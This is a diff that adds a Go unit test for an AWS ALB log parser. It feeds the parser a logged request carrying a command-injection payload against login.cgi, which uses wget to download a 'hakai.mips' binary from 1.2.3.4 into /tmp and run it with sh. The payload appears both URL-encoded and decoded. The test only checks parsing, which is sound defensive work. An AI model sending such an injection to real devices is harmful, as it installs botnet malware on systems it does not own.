@@ -147,3 +147,27 @@ wss 2016-08-10T00:42:46.423695Z app/my-loadbalancer/50dc6c495c0c9188 10.0.0.140:
 	errorLinesExpected := []string{}
 	logparser.AssertLogParser(t, S3ALBLogParser, &logs, expected, errorLinesExpected)
 }
+
+func TestS3ALBLogParserStrangeEntries(t *testing.T) {
+	logs := `http 2018-08-19T15:14:55.207720Z app/my-loadbalancer/50dc6c495c0c9188 41.233.25.52:58750 - -1 -1 -1 400 - 211 288 "GET http://www.example.com:80/login.cgi?cli=aa%20aa%27;wget%20http://1.2.3.4/hakai.mips%20-O%20-%3E%20/tmp/hk;sh%20/tmp/hk%27$ HTTP/1.1" "Hakai/2.0" - - - "-" "-" "-" - 2018-08-19T15:14:55.205000Z "-" "-"`
+	expected := []beat.Event{
+		beat.Event{
+			Timestamp: time.Date(2018, 8, 19, 15, 14, 55, 207720000, time.UTC),
+			Fields: common.MapStr{
+				"type":            "http",
+				"elb":             "app/my-loadbalancer/50dc6c495c0c9188",
+				"client_ip":       "41.233.25.52",
+				"client_port":     uint16(58750),
+				"elb_status_code": int16(400),
+				"received_bytes":  int64(211),
+				"sent_bytes":      int64(288),
+				"request_verb":    "GET",
+				"request_url":     "http://www.example.com:80/login.cgi?cli=aa aa';wget http://1.2.3.4/hakai.mips -O -> /tmp/hk;sh /tmp/hk'$",
+				"request_proto":   "HTTP/1.1",
+				"user_agent":      "Hakai/2.0",
+			},
+		},
+	}
+	errorLinesExpected := []string{}
+	logparser.AssertLogParser(t, S3ALBLogParser, &logs, expected, errorLinesExpected)
+}
